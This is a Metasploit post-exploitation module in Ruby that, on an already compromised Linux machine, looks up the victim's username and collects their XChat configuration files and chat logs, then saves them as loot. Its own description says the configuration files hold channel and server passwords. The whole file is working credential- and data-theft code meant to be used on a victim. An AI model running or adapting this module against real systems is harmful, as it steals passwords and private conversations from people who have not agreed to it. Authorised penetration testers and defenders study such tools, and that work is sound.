##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Linux Gather XChat Enumeration',
      'Description'   => %q{
          This module will collect XChat's config files and chat logs from the victim's
        machine.  There are three actions you may choose: CONFIGS, CHATS, and ALL.  The
        CONFIGS option can be used to collect information such as channel settings,
        channel/server passwords, etc.  The CHATS option will simply download all the
        .log files.
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['sinn3r'],
      'Platform'      => ['linux'],
      # linux meterpreter is too busted to support right now,
      # will come back and add support once it's more usable.
      'SessionTypes'  => ['shell', 'meterpreter'],
      'Actions'       =>
        [
          ['CONFIGS', { 'Description' => 'Collect XCHAT\'s config files' } ],
          ['CHATS',   { 'Description' => 'Collect chat logs with a pattern' } ],
          ['ALL',     { 'Description' => 'Collect both the plists and chat logs'}]
        ],
      'DefaultAction' => 'ALL'
    ))
  end

  def get_file(file)
    tries = 0
    print_status("#{@peer} - Downloading #{file}")

    begin
      buf = read_file(file)
      buf = '' if buf =~ /No such file or directory/
    rescue ::Timeout::Error => e
      tries += 1
      if tries < 3
        vprint_error("#{@peer} - #{e.message} - retrying...")
        retry
      end
      buf = ''
    rescue EOFError => e
      tries += 1
      if tries < 3
        vprint_error("#{@peer} - #{e.message} - retrying...")
        retry
      end
      buf = ''
    end

    return buf
  end

  def whoami
    user = cmd_exec("/usr/bin/whoami").chomp
    return user
  end

  def list_logs(base)
    list = cmd_exec("ls -l #{base}*.log")

    return [] if list =~ /No such file or directory/
    files = list.scan(/\d+\x20\w{3}\x20\d+\x20\d{2}\:\d{2}\x20(.+)$/).flatten

    return files
  end

  def save(type, data)
    case type
    when :configs
      type = 'xchat.config'
    when :chatlogs
      type = 'xchat.chatlogs'
    end

    data.each do |d|
      fname = ::File.basename(d[:filename])
      p = store_loot(
        type,
        'text/plain',
        session,
        d[:data],
        fname
      )

      print_good("#{@peer} - #{fname} saved as #{p}")
    end
  end

  def get_chatlogs(base)
    base << "xchatlogs/"

    logs = []

    list_logs(base).each do |l|
      vprint_status("#{@peer} - Downloading: #{l}")
      data = read_file(l)
      logs << {
        :filename => l,
        :data     => data
      }
    end

    return logs
  end

  def get_configs(base)
    config = []
    files  = ['servlist_.conf', 'xchat.conf']
    files.each do |f|
      vprint_status("#{@peer} - Downloading: #{base + f}")
      buf = read_file(base + f)
      next if buf.blank?
      config << {
        :filename => f,
        :data     => buf
      }
    end

    return config
  end

  def run
    if action.nil?
      print_error("Please specify an action")
      return
    end

    @peer = "#{session.session_host}:#{session.session_port}"

    user = whoami
    if user.blank?
      print_error("#{@peer} - Unable to get username, abort.")
      return
    end

    base = "/home/#{user}/.xchat2/"

    configs  = get_configs(base)  if action.name =~ /ALL|CONFIGS/i
    chatlogs = get_chatlogs(base) if action.name =~ /ALL|CHATS/i

    save(:configs, configs)   unless configs.empty?
    save(:chatlogs, chatlogs) unless chatlogs.empty?
  end
end

=begin
Linux xchat path:
/home/[username]/.xchat2/
  * /home/[username]/.xchat2/servlist_.conf
  * /home/[username]/.xchat2/xchat.conf
  * /home/[username]/.xchat2/xchatlogs/FreeNode-#aha.log
=end
